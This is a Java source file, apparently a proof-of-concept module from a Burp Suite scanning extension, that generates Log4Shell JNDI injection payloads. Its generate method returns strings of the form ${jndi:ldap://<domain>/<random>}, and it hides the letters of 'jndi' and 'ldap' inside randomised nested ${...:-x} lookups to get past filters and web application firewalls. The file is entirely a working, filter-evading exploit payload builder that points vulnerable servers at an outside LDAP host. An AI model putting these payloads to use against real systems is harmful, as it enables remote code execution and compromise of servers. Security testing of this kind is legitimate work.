package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

import java.util.Arrays;

public class POC2 implements IPOC {
    private String confusion() {
        StringBuilder result = new StringBuilder();
        result.append(confusionChars(new String[]{"j", "n", "d", "i"}));
        result.append(":");
        result.append(confusionChars(new String[]{"l", "d", "a", "p"}));
        return result.toString();
    }

    private String confusionChars(String[] _chars) {
        StringBuilder result = new StringBuilder();
        int confusionCount = Utils.GetRandomNumber(1, 4);
        int[] confustionCharIndexs = Utils.getRandomIndex(confusionCount, _chars.length);
        for (int i = 0; i < _chars.length; i++) {
            int finalI = i;
            if (Arrays.stream(confustionCharIndexs).anyMatch(c -> c == finalI)) {
                result.append(confusionChar(_chars[i]));
            } else {
                result.append(_chars[i]);
            }
        }
        return result.toString();
    }

    private String confusionChar(String _char) {
        int garbageCount = Utils.GetRandomNumber(2, 5);
        StringBuilder garbage = new StringBuilder();
        for (int i = 0; i < garbageCount; i++) {
            int garbageLength = Utils.GetRandomNumber(3, 6);
            String garbageWord = Utils.GetRandomString(garbageLength);
            garbage.append(garbageWord).append(":");
        }
        return String.format("${%s-%s}", garbage, _char);
    }

    @Override
    public String generate(String domain) {
        return "${" + confusion() + "://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }
}